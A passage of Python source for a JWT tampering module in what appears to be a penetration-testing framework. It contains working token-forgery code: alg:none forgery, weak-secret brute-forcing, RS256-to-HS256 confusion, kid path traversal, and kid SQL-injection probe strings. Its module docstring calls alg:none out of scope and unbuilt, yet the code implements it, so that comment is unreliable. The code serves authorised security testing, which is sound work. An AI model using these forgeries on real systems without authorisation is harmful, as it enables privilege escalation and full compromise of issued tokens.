"""Layer 9 — `stof/modules/jwt_tests.py`: JWT role-claim tampering
(TC-057 JWT Role Manipulation).

Scoped deliberately narrow, to IDOR/Privilege-Escalation work only, at
explicit user instruction. CLAUDE.md's own line for this file is wider
("JWT replay, expiry, alg:none (Phase 1)") -- `alg:none` in particular
is a signature-verification / authentication-bypass technique, not a
privilege-escalation one, so it's out of scope here and not built.
Replay/expiry handling already exists at Layer 4/5 (`jwt_auth.py`'s
`decode_jwt_exp` + `session_manager`'s refresh flow) and isn't a
`VulnModule` finding on its own.

TC-057 lives here rather than in `idor_tests.py` because it's a
JWT-specific technique (tamper a claim, keep the original signature,
see if the server actually verifies it), not a generic IDOR/BFLA one --
but it answers the same underlying question as the rest of this
category: can this session act with more privilege than it was granted.

Only applicable to sessions authenticated via `auth_type == "jwt"` --
this project's own demo target (demo.testfire.net) authenticates via
session cookies, not JWTs, so this module has no live finding surface
there. Built and fully unit-tested regardless, against synthetic JWTs,
ready for a JWT-based target.

The probe first sends an obviously-invalid control token
(`garbage.invalid.token`). If the target endpoint accepts that too, it
isn't checking auth at all -- a real problem, but not a JWT-specific
one, and flagging role-tampering there would be misleading noise, so
that role is skipped with a warning instead.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from stof.core.logger import get_logger
from stof.findings.models import Finding

from ._injection_shared import looks_like_sql_error
from .base import VulnModule
from .results import FAIL, PASS, SKIPPED, TestCaseResult

if TYPE_CHECKING:
    from stof.crawler.endpoint_store import Endpoint
    from stof.engine.multi_session import SessionPool
    from stof.evidence.collector import EvidenceCollector
    from stof.session.session_manager import SessionManager

_log = get_logger("modules.jwt_tests")

# A short, well-known list (rotated across countless public JWT-secret
# wordlists, e.g. wallarm/jwt-secrets) -- not exhaustive, but enough to
# catch the common case of a default/example secret left in place.
_COMMON_JWT_SECRETS = (
    "secret", "secretkey", "jwt_secret", "jwtsecret", "changeme", "password",
    "123456", "your-256-bit-secret", "supersecret", "s3cr3t", "test", "key",
    "your_jwt_secret", "jwtSecret", "mysecretkey", "qwerty", "admin",
)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode_json(segment: str) -> dict | None:
    padding = "=" * (-len(segment) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(segment + padding))
    except Exception:
        return None


def decode_jwt_payload(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return _b64url_decode_json(parts[1])


def _get_claim(payload: dict, claim_path: str) -> object:
    """`claim_path` supports dotted paths (e.g. "data.role") for real
    JWTs that nest all claims under a wrapper key instead of a flat
    top-level one (confirmed live) -- a plain top-level claim is just a
    single-segment path, so this subsumes the old flat-only lookup."""
    value: object = payload
    for part in claim_path.split("."):
        if not isinstance(value, dict) or part not in value:
            return None
        value = value[part]
    return value


def _set_claim(payload: dict, claim_path: str, value: object) -> dict:
    parts = claim_path.split(".")
    result = json.loads(json.dumps(payload))
    node = result
    for part in parts[:-1]:
        node = node[part]
    node[parts[-1]] = value
    return result


def forge_role_claim_token(token: str, role_claim: str, elevated_value: str) -> str | None:
    """Change a role/privilege claim in the payload while keeping the
    original header and (now-mismatched) signature -- tests whether the
    server actually verifies the signature or just trusts the decoded
    claims outright. Returns None if `role_claim` isn't present in the
    token's payload -- nothing to tamper with."""
    parts = token.split(".")
    payload = decode_jwt_payload(token)
    if payload is None or len(parts) != 3 or _get_claim(payload, role_claim) is None:
        return None
    tampered_payload = _set_claim(payload, role_claim, elevated_value)
    payload_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
    return f"{parts[0]}.{payload_b64}.{parts[2]}"


def decode_jwt_header(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return _b64url_decode_json(parts[0])


def forge_alg_none_token(token: str, role_claim: str, elevated_value: str) -> str | None:
    """Change a role/privilege claim AND switch the header's `alg` to
    `"none"` with an empty signature segment -- the classic alg:none
    bypass, which some JWT libraries accept because they trust the
    algorithm the token itself claims to use rather than a server-side
    allow-list. Returns None if `role_claim` isn't present."""
    payload = decode_jwt_payload(token)
    if payload is None or _get_claim(payload, role_claim) is None:
        return None
    tampered_payload = _set_claim(payload, role_claim, elevated_value)
    header_b64 = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _hmac_sha256(signing_input: bytes, secret: str) -> str:
    digest = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return _b64url_encode(digest)


def find_weak_hmac_secret(token: str, candidates: tuple[str, ...] = _COMMON_JWT_SECRETS) -> str | None:
    """Returns the first candidate secret whose HMAC-SHA256 signature
    over this token's header+payload matches its actual signature --
    i.e. the target's real signing secret, if it's one of `candidates`.
    Only meaningful for an HS256 token; callers check `alg` first."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_signature = parts[2]
    return next((s for s in candidates if _hmac_sha256(signing_input, s) == target_signature), None)


def forge_role_claim_token_signed(token: str, role_claim: str, elevated_value: str, secret: str) -> str | None:
    """Like `forge_role_claim_token()`, but properly re-signs the
    tampered payload with a recovered secret -- producing a token that
    passes signature verification outright, not merely one whose
    mismatch the target happens not to check."""
    parts = token.split(".")
    payload = decode_jwt_payload(token)
    if payload is None or len(parts) != 3 or _get_claim(payload, role_claim) is None:
        return None
    tampered_payload = _set_claim(payload, role_claim, elevated_value)
    payload_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
    signing_input = f"{parts[0]}.{payload_b64}".encode()
    signature = _hmac_sha256(signing_input, secret)
    return f"{parts[0]}.{payload_b64}.{signature}"


# Path-hint list for discovering a JWKS-shaped endpoint among crawled
# endpoints. Deliberately a small local list here rather than importing
# `_looks_privileged`/its hints from `stof/modules/_idor_shared.py` --
# that helper belongs to a different attack family (object-reference /
# tenant-scope hints), and CLAUDE.md's no-cross-sibling-import rule
# means "shape-similar" isn't a reason to couple the two. The
# substring-in-path matching convention is kept identical for
# consistency, just re-declared locally.
_JWKS_PATH_HINTS = ("jwks.json", "/jwks", ".well-known/jwks")


def _looks_like_jwks_path(url: str) -> bool:
    path = urlsplit(url).path.lower()
    return any(hint in path for hint in _JWKS_PATH_HINTS)


def find_jwks_endpoint(endpoints: list["Endpoint"]) -> "Endpoint | None":
    """First crawled endpoint whose path looks JWKS-shaped, or None if
    none was discovered -- a common, legitimate outcome for an RS256
    deployment that doesn't expose its JWKS publicly, not an error."""
    return next((e for e in endpoints if _looks_like_jwks_path(e.url)), None)


def jwks_hmac_secret(jwks_body: str) -> bytes | None:
    """Extract the first RSA key's modulus ('n') from a JWKS response
    body and base64url-decode it to raw bytes -- the candidate HMAC
    secret for the RS256->HS256 algorithm-confusion technique (the
    server's own public key material, reused as a shared secret).
    Returns None if the body isn't parseable JSON or has no usable RSA
    key entry."""
    try:
        data = json.loads(jwks_body)
    except (json.JSONDecodeError, TypeError):
        return None
    keys = data.get("keys") if isinstance(data, dict) else None
    if not keys:
        return None
    for key in keys:
        n = key.get("n") if isinstance(key, dict) else None
        if not n:
            continue
        padding = "=" * (-len(n) % 4)
        try:
            return base64.urlsafe_b64decode(n + padding)
        except (ValueError, TypeError):
            continue
    return None


def forge_algorithm_confusion_token(token: str, role_claim: str, elevated_value: str, hmac_key: bytes) -> str | None:
    """Change a role/privilege claim and switch the header's `alg` to
    `HS256`, signed with `hmac_key` -- the server's own RS256 public
    key material, reused as an HMAC secret. The classic RS256->HS256
    algorithm-confusion bypass: a server that dynamically trusts the
    token's own `alg` header can be tricked into verifying an
    HS256-signed token against its own asymmetric public key. Returns
    None if `role_claim` isn't present in the token's payload."""
    payload = decode_jwt_payload(token)
    if payload is None or _get_claim(payload, role_claim) is None:
        return None
    tampered_payload = _set_claim(payload, role_claim, elevated_value)
    header_b64 = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = _b64url_encode(hmac.new(hmac_key, signing_input, hashlib.sha256).digest())
    return f"{header_b64}.{payload_b64}.{signature}"


# TC-057.8 -- `kid` (Key ID) header injection. RFC 7515 (JWS) §4.1.4
# defines `kid` as a hint the CLIENT sends to tell the verifier which
# key to use -- it is attacker-controlled data by design, and RFC 7515
# places no constraint on how a relying party resolves it to an actual
# key. PortSwigger's own JWT attack material documents two well-known
# failure modes when a server's `kid`-resolution code trusts that hint
# too literally: (a) `kid` built into a filesystem/URL path without
# sanitization -- a relative path traversal to a predictable,
# effectively-empty file (`/dev/null` on Unix) lets an attacker sign a
# token with the empty string as the HMAC secret and have it verify
# successfully; (b) `kid` built into a database query without
# parameterization during key lookup -- the exact same SQL-injection
# shape as this codebase's own `sqli_tests.py`, just with the injection
# point moved from a request query/body param into a JWT header claim.
# Windows path-traversal candidate uses 8 `../` segments (worst-case
# nesting depth for a typical web-app deploy path) rather than a
# shorter Unix-style count, since an over-long relative path simply
# resolves to filesystem root and stays valid -- unlike an under-long
# one, which would land inside the app's own directory tree instead of
# escaping it.
_KID_PATH_TRAVERSAL_CANDIDATES = (
    "../../../../dev/null",
    "../../../../../../../../dev/null",
)

# Reuses the exact same syntax-breaking shapes as `sqli_tests.py`'s
# `_ERROR_BASED_PAYLOADS` (a subset -- `kid` is a single header CLAIM
# value, not a full query/body param, so the shorter list is enough to
# break out of whatever quoting the server's key-lookup query uses);
# detection is `looks_like_sql_error()`, imported unchanged from
# `_injection_shared.py` (see that file's own promotion comment).
_KID_SQLI_PROBE_VALUES = ("'", "' OR '1'='1", "'--")


def forge_kid_path_traversal_token(
    token: str, role_claim: str, elevated_value: str, kid_path: str, key_content: bytes = b"",
) -> str | None:
    """Set the header's `alg` to `HS256` and `kid` to `kid_path` (a
    relative path traversal to a file whose content is known/predictable
    -- `key_content`, default the empty bytestring for `/dev/null`), sign
    with `key_content` as the HMAC secret, and change `role_claim` to
    `elevated_value` -- the classic PortSwigger-documented `kid` path
    traversal bypass. If the server's key-resolution code passes `kid`
    into a filesystem read unsanitized and uses the file's raw bytes as
    the verification key, this token's signature verifies. Returns None
    if `role_claim` isn't present in the token's payload."""
    payload = decode_jwt_payload(token)
    if payload is None or _get_claim(payload, role_claim) is None:
        return None
    tampered_payload = _set_claim(payload, role_claim, elevated_value)
    header_b64 = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid_path}, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(tampered_payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = _b64url_encode(hmac.new(key_content, signing_input, hashlib.sha256).digest())
    return f"{header_b64}.{payload_b64}.{signature}"


def forge_kid_injection_token(token: str, kid_value: str) -> str | None:
    """Set the header's `kid` to `kid_value` (a syntax-breaking probe
    string), keeping the original `alg`/payload and the now-likely-
    mismatched signature unchanged -- this variant never needs or claims
    an accepted forgery, only a DB-error fingerprint in the response,
    proving `kid` flows unsanitized into a query during key lookup
    (whether or not that lookup happens before or after signature
    verification). Returns None if `token` isn't a well-formed
    three-segment JWT."""
    parts = token.split(".")
    header = decode_jwt_header(token)
    if header is None or len(parts) != 3:
        return None
    tampered_header = dict(header)
    tampered_header["kid"] = kid_value
    header_b64 = _b64url_encode(json.dumps(tampered_header, separators=(",", ":")).encode())
    return f"{header_b64}.{parts[1]}.{parts[2]}"


# Loose but deliberately conservative shape-match for a JWT embedded in
# a URL or a storage value: three base64url segments, the first
# starting with "eyJ" (the base64url encoding of `{"` -- true of every
# real JWT header, which always starts with a JSON object). Minimum
# segment lengths avoid matching short unrelated dot-separated tokens
# (e.g. a semver string or a hostname) as a false positive.
_JWT_SHAPE_RE = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")


def find_jwt_in_text(text: str) -> str | None:
    """First JWT-shaped substring found in `text` (a URL or a browser
    storage value), or None. Passive pattern match only -- does not
    decode or validate the match, since even a false-positive-shaped
    match found in a URL/localStorage is itself the exposure being
    tested for (a real JWT wouldn't be there at all)."""
    match = _JWT_SHAPE_RE.search(text)
    return match.group(0) if match else None


# Standard registered claims (RFC 7519 §4.1) this module can tamper and
# check for enforcement, each with a value guaranteed to be invalid
# under the claim's own defined semantics, plus a short reason string
# used in finding text. `iat`/`nbf`/`exp` are integers (seconds since
# epoch, per the RFC); `aud`/`iss` are the STOF-specific placeholder
# strings a real deployment could never legitimately match.
def _claim_validation_cases(now: int) -> tuple[tuple[str, object, str], ...]:
    return (
        ("exp", now - 3600, "an 'exp' one hour in the past (already expired)"),
        ("nbf", now + 3600, "an 'nbf' one hour in the future (not yet valid)"),
        ("iat", now + 3600, "an 'iat' one hour in the future (issued-in-the-future)"),
        ("aud", "stof-unexpected-audience", "an 'aud' this token was never issued for"),
        ("iss", "stof-unexpected-issuer", "an 'iss' this token was never issued by"),
    )


async def _probe(context, url: str, token: str) -> tuple[int, str]:
    resp = await context.request.get(url, headers={"Authorization": f"Bearer {token}"}, max_redirects=0)
    body = await resp.text()
    return resp.status, body


@dataclass
class JwtTestConfig:
    role_claim: str = "role"
    elevated_value: str = "admin"
    min_content_length: int = 100
    # TC-057.6 (replay-after-logout) only: a JWT-authenticated target's
    # logout endpoint, if one exists. No generic JWT logout/revocation
    # mechanism exists anywhere in this codebase to auto-discover (see
    # `session_weakness_tests.py`'s TC-129.2, which locates a *cookie*
    # session's logout link via DOM click-through -- meaningless for a
    # bearer token with no session cookie to clear). Left unset, this
    # technique honestly SKIPs rather than guessing at a URL.
    logout_url: str | None = None


class JwtTestsModule(VulnModule):
    module_id = "jwt_tests"
    name = "JWT Role Claim Tampering Test"
    phase = 1

    def __init__(self, roles: list[str], config: JwtTestConfig | None = None) -> None:
        # Explicit, config-driven -- same philosophy as IdorTestsModule's
        # high_priv_role/low_priv_role: the caller states which roles are
        # JWT-authenticated rather than this module guessing from
        # SessionManager internals it has no business reaching into.
        self.roles = roles
        self.config = config or JwtTestConfig()

    async def run(
        self,
        endpoints: list["Endpoint"],
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None" = None,
    ) -> list[Finding]:
        # Prefer a real "api" endpoint over a "page" one: an SPA's page
        # routes are typically served by the client-side router
        # regardless of auth state (the server has no reason to gate a
        # static app shell), so probing one tells us nothing about
        # whether the *backend* actually verifies JWT claims -- confirmed
        # live: picking a page route made the control-token check look
        # "not auth-checked at all" and skip, when a real API endpoint
        # on the same target does enforce auth. Any auth_required GET
        # is still accepted as a fallback for a target with no api-typed
        # endpoints discovered.
        candidates = [e for e in endpoints if e.auth_required and e.method.upper() == "GET"]
        target_endpoint = next((e for e in candidates if e.endpoint_type == "api"), None) or next(iter(candidates), None)
        if target_endpoint is None:
            _log.info("jwt_tests: no auth-required GET endpoint discovered -- nothing to probe")
            return []

        findings: list[Finding] = []
        for role in self.roles:
            findings.extend(await self._test_role(role, target_endpoint, session_manager, session_pool, evidence))
        return findings

    async def _capture_evidence(self, evidence, context, session, url: str, token: str, label: str, finding: Finding | None = None) -> list[str]:
        """Opportunistic, called only after a finding is already
        confirmed (Layer 12's "never called speculatively" rule).
        Sets the forged token as the context's default Authorization
        header so the navigated page actually renders under it.
        `finding`, when given, also gets its request/response text
        rendered as a styled evidence image alongside the screenshot."""
        if evidence is None:
            return []
        try:
            await context.set_extra_http_headers({"Authorization": f"Bearer {token}"})
        except Exception as exc:
            _log.warning(f"could not set forged Authorization header for evidence capture: {exc}")
            return []
        page = await context.new_page()
        try:
            await page.goto(url)
            request_raw = finding.request_raw if finding is not None else ""
            response_raw = finding.response_raw if finding is not None else ""
            return await evidence.capture(page, session, label=label, request_raw=request_raw, response_raw=response_raw)
        except Exception as exc:
            _log.warning(f"evidence capture failed for '{label}': {exc}")
            return []
        finally:
            await page.close()

    async def _test_role(self, role, target_endpoint, session_manager, session_pool, evidence=None) -> list[Finding]:
        target_url = target_endpoint.url
        try:
            session, context = await self._authenticated_context(session_manager, session_pool, role, target_url)
        except KeyError as exc:
            _log.warning(f"skipping jwt_tests for role '{role}': {exc}")
            return []

        if session.auth_type != "jwt":
            _log.info(f"role '{role}' is not JWT-authenticated (auth_type={session.auth_type}) -- skipping")
            return []

        token = session.headers.get("Authorization", "").removeprefix("Bearer ").strip()
        if token.count(".") != 2:
            _log.warning(f"role '{role}' session has no well-formed JWT (three dot-separated parts) to tamper with")
            return []

        control_status, control_body = await _probe(context, target_url, "garbage.invalid.token")
        if control_status == 200 and len(control_body) >= self.config.min_content_length:
            _log.warning(
                f"'{target_url}' accepted an obviously-invalid bearer token -- it isn't "
                "auth-checked at all, skipping the role-tampering probe to avoid a misleading finding"
            )
            return []

        role_tampered_token = forge_role_claim_token(token, self.config.role_claim, self.config.elevated_value)
        if role_tampered_token is None:
            return []

        status, body = await _probe(context, target_url, role_tampered_token)
        if status != 200 or len(body) < self.config.min_content_length:
            return []

        finding = Finding(
            module_id=self.module_id,
            vuln_type="JWT Role Manipulation",
            severity="Critical",
            cvss_score=8.8,
            endpoint=target_endpoint,
            user_role=role,
            request_raw=f"GET {target_url}\nAuthorization: Bearer {role_tampered_token}",
            response_raw=f"HTTP {status}, {len(body)} bytes",
            description=(
                f"'{target_url}' accepted a JWT whose '{self.config.role_claim}' claim was "
                f"changed to '{self.config.elevated_value}' while keeping the original "
                f"(now-mismatched) signature, for role '{role}'. This indicates the server is "
                "not verifying the token's signature against its claims, allowing any holder "
                "of a validly-issued token to escalate their own privileges by editing it "
                "client-side."
            ),
            recommendation=(
                "Always verify a JWT's signature against its full current payload before "
                "trusting any claim in it, using a server-held key -- never trust decoded "
                "claims from a token whose signature wasn't cryptographically verified."
            ),
        )
        finding.evidence_refs = await self._capture_evidence(
            evidence, context, session, target_url, role_tampered_token, label=f"jwt-role-{role}", finding=finding)
        return [finding]

    # ------------------------------------------------------------------
    # Per-technique layer (`run_techniques()`) -- TC-057's 3 techniques
    # from EXPLOIT_COVERAGE.md. `_test_role`/`run()` above are untouched;
    # `_prepare_role` duplicates a little of `_test_role`'s setup rather
    # than refactor it, for the same reason `idor_tests.py` keeps its
    # original three methods verbatim: zero risk to already-passing
    # tests built against `run()`'s exact behavior.
    # ------------------------------------------------------------------

    def _result(self, technique_id: str, technique: str, vuln_type: str, status: str, detail: str,
                role: str | None = None, endpoint=None, finding: Finding | None = None) -> TestCaseResult:
        return self._make_result(
            test_id="TC-057", technique_id=technique_id, technique=technique, vuln_type=vuln_type,
            status=status, detail=detail, role=role, endpoint=endpoint, finding=finding,
        )

    async def _prepare_role(self, role, target_endpoint, session_manager, session_pool):
        """Shared setup for every TC-057 technique: resolve the role's
        session, confirm it's a well-formed JWT, get an authenticated
        context, and run the control probe (an obviously-invalid token)
        so a target that doesn't check auth at all doesn't produce a
        misleading JWT-specific result. Returns `(session, context,
        token, None)` on success, or `(None, None, None, skip_reason)`."""
        try:
            session, context = await self._authenticated_context(session_manager, session_pool, role, target_endpoint.url)
        except KeyError as exc:
            return None, None, None, f"role not configured: {exc}"

        if session.auth_type != "jwt":
            return None, None, None, f"role '{role}' is not JWT-authenticated (auth_type={session.auth_type})"

        token = session.headers.get("Authorization", "").removeprefix("Bearer ").strip()
        if token.count(".") != 2:
            return None, None, None, f"role '{role}' session has no well-formed JWT (three dot-separated parts) to tamper with"

        control_status, control_body = await _probe(context, target_endpoint.url, "garbage.invalid.token")
        if control_status == 200 and len(control_body) >= self.config.min_content_length:
            return None, None, None, f"'{target_endpoint.url}' accepts an obviously-invalid bearer token -- not JWT-auth-checked, skipping to avoid a misleading finding"

        return session, context, token, None

    async def _technique_mismatched_sig(self, role, target_endpoint, session_manager, session_pool, evidence) -> TestCaseResult:
        technique, vuln_type = "Edit role claim, keep the original mismatched signature", "JWT Role Manipulation"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.1", technique, vuln_type, SKIPPED, skip_reason, role=role)

        forged = forge_role_claim_token(token, self.config.role_claim, self.config.elevated_value)
        if forged is None:
            return self._result("TC-057.1", technique, vuln_type, SKIPPED, f"'{self.config.role_claim}' claim not present in this token", role=role)

        status, body = await _probe(context, target_endpoint.url, forged)
        if status != 200 or len(body) < self.config.min_content_length:
            return self._result("TC-057.1", technique, vuln_type, PASS, f"signature-mismatched tampered token was rejected (HTTP {status})", role=role, endpoint=target_endpoint)

        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=8.8,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
            response_raw=f"HTTP {status}, {len(body)} bytes",
            description=(
                f"'{target_endpoint.url}' accepted a JWT whose '{self.config.role_claim}' claim was changed "
                f"to '{self.config.elevated_value}' while keeping the original (now-mismatched) signature, "
                f"for role '{role}'. The server is not verifying the token's signature against its claims."
            ),
            recommendation="Always verify a JWT's signature against its full current payload before trusting any claim in it.",
        )
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-mismatched-sig-{role}", finding=finding)
        return self._result("TC-057.1", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _technique_alg_none(self, role, target_endpoint, session_manager, session_pool, evidence) -> TestCaseResult:
        technique, vuln_type = "Edit role claim and switch alg to none", "JWT Role Manipulation via alg:none"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.2", technique, vuln_type, SKIPPED, skip_reason, role=role)

        forged = forge_alg_none_token(token, self.config.role_claim, self.config.elevated_value)
        if forged is None:
            return self._result("TC-057.2", technique, vuln_type, SKIPPED, f"'{self.config.role_claim}' claim not present in this token", role=role)

        status, body = await _probe(context, target_endpoint.url, forged)
        if status != 200 or len(body) < self.config.min_content_length:
            return self._result("TC-057.2", technique, vuln_type, PASS, f"alg:none-forged token was rejected (HTTP {status})", role=role, endpoint=target_endpoint)

        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.1,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
            response_raw=f"HTTP {status}, {len(body)} bytes",
            description=(
                f"'{target_endpoint.url}' accepted a JWT with its algorithm switched to 'none' and its "
                f"'{self.config.role_claim}' claim changed to '{self.config.elevated_value}', for role "
                f"'{role}'. The server accepts a client-chosen signing algorithm instead of enforcing one."
            ),
            recommendation="Explicitly reject the 'none' algorithm server-side; only accept an allow-listed set of signing algorithms configured server-side, never one taken from the token's own header.",
        )
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-alg-none-{role}", finding=finding)
        return self._result("TC-057.2", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _technique_weak_secret(self, role, target_endpoint, session_manager, session_pool, evidence) -> TestCaseResult:
        technique, vuln_type = "Edit role claim after brute-forcing a weak HMAC secret", "JWT Role Manipulation via weak HMAC secret"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.3", technique, vuln_type, SKIPPED, skip_reason, role=role)

        header = decode_jwt_header(token)
        alg = (header or {}).get("alg", "").upper()
        if alg not in ("HS256", "HS384", "HS512"):
            return self._result("TC-057.3", technique, vuln_type, SKIPPED, f"token alg '{alg or '?'}' is not HMAC -- secret brute-force doesn't apply", role=role)

        secret = find_weak_hmac_secret(token)
        if secret is None:
            return self._result("TC-057.3", technique, vuln_type, PASS, f"none of {len(_COMMON_JWT_SECRETS)} common weak secrets matched this token's signature", role=role, endpoint=target_endpoint)

        forged = forge_role_claim_token_signed(token, self.config.role_claim, self.config.elevated_value, secret)
        if forged is None:
            return self._result("TC-057.3", technique, vuln_type, SKIPPED, f"'{self.config.role_claim}' claim not present in this token", role=role)

        status, body = await _probe(context, target_endpoint.url, forged)
        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.8,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
            response_raw=f"HTTP {status}, {len(body)} bytes",
            description=(
                f"The target's JWT signing secret was recovered by brute-forcing a list of "
                f"{len(_COMMON_JWT_SECRETS)} common/default secrets. A token re-signed with the recovered "
                f"secret and '{self.config.role_claim}' set to '{self.config.elevated_value}' was accepted "
                f"for role '{role}' -- full compromise of every JWT this signing key issues."
            ),
            recommendation="Use a long, randomly generated signing secret (or asymmetric keys) that is never a dictionary word or vendor default, and rotate it immediately if this is confirmed.",
        )
        if status != 200 or len(body) < self.config.min_content_length:
            # Secret recovery alone is already a serious finding even if
            # this specific probe endpoint still rejected the request.
            finding.description += " (the probe endpoint itself returned HTTP " + str(status) + ", but the secret recovery is proven independent of this endpoint's response.)"
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-weak-secret-{role}", finding=finding)
        return self._result("TC-057.3", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _technique_algorithm_confusion(self, role, target_endpoint, endpoints, session_manager, session_pool, evidence) -> TestCaseResult:
        technique = "Sign a role-tampered token as HS256 using the server's own RS256 public key as the HMAC secret"
        vuln_type = "JWT Role Manipulation via Algorithm Confusion (RS256->HS256)"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.4", technique, vuln_type, SKIPPED, skip_reason, role=role)

        header = decode_jwt_header(token)
        alg = (header or {}).get("alg", "").upper()
        if alg not in ("RS256", "RS384", "RS512"):
            return self._result(
                "TC-057.4", technique, vuln_type, SKIPPED,
                f"token alg '{alg or '?'}' is not asymmetric -- algorithm confusion has no surface here", role=role,
            )

        jwks_endpoint = find_jwks_endpoint(endpoints)
        if jwks_endpoint is None:
            return self._result(
                "TC-057.4", technique, vuln_type, SKIPPED,
                "no JWKS-shaped endpoint discovered (e.g. /.well-known/jwks.json) -- the public key "
                "isn't independently discoverable, a common outcome for RS256 deployments that don't "
                "expose their JWKS publicly",
                role=role,
            )

        probed = await self._probe_get(context, jwks_endpoint.url)
        if probed is None:
            return self._result("TC-057.4", technique, vuln_type, SKIPPED, f"could not fetch JWKS from '{jwks_endpoint.url}'", role=role)
        jwks_status, jwks_body = probed
        if jwks_status != 200:
            return self._result("TC-057.4", technique, vuln_type, SKIPPED, f"JWKS endpoint '{jwks_endpoint.url}' returned HTTP {jwks_status}, not a usable key", role=role)

        hmac_key = jwks_hmac_secret(jwks_body)
        if hmac_key is None:
            return self._result("TC-057.4", technique, vuln_type, SKIPPED, f"JWKS response from '{jwks_endpoint.url}' had no usable RSA key material", role=role)

        forged = forge_algorithm_confusion_token(token, self.config.role_claim, self.config.elevated_value, hmac_key)
        if forged is None:
            return self._result("TC-057.4", technique, vuln_type, SKIPPED, f"'{self.config.role_claim}' claim not present in this token", role=role)

        status, body = await _probe(context, target_endpoint.url, forged)
        if status != 200 or len(body) < self.config.min_content_length:
            return self._result("TC-057.4", technique, vuln_type, PASS, f"algorithm-confused HS256 token was rejected (HTTP {status})", role=role, endpoint=target_endpoint)

        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.8,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
            response_raw=f"HTTP {status}, {len(body)} bytes",
            description=(
                f"'{target_endpoint.url}' accepted a JWT re-signed with algorithm 'HS256' using the "
                f"server's own RS256 public key (fetched from '{jwks_endpoint.url}') as the HMAC "
                f"secret, with '{self.config.role_claim}' changed to '{self.config.elevated_value}', "
                f"for role '{role}'. This is the classic RS256->HS256 algorithm-confusion bypass: the "
                "server dynamically trusts the token's own 'alg' header instead of enforcing the "
                "algorithm it originally issued the token with, so its own publicly discoverable "
                "public key can be replayed back as a shared HMAC secret."
            ),
            recommendation=(
                "Enforce a single, server-configured signing algorithm per key -- never take 'alg' "
                "from the token itself -- and never allow a key registered for asymmetric "
                "verification to also be accepted for HMAC verification."
            ),
        )
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-alg-confusion-{role}", finding=finding)
        return self._result("TC-057.4", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _recover_signing_forger(self, context, token, target_endpoint, endpoints):
        """Shared setup for TC-057.5 (claim validation): obtain a way to
        produce a VALIDLY-signed tampered token, reusing whichever
        signing capability TC-057.3/.4 already established this run --
        a weak HMAC secret, or (for RS256) the server's own JWKS reused
        as an HMAC-confusion key. Deliberately does NOT fall back to
        TC-057.1's keep-the-mismatched-signature shape: a request
        rejected with a mismatched signature is indistinguishable from
        one rejected specifically because of an invalid claim, so
        proving claim-blindness needs a signature the server actually
        accepts. Returns `(forger, method_label)` where
        `forger(claim_path, value) -> str | None`, or `(None,
        skip_reason)` if no signing capability could be recovered."""
        header = decode_jwt_header(token)
        alg = (header or {}).get("alg", "").upper()

        if alg in ("HS256", "HS384", "HS512"):
            secret = find_weak_hmac_secret(token)
            if secret is None:
                return None, (
                    f"none of {len(_COMMON_JWT_SECRETS)} common weak secrets matched this HMAC token's "
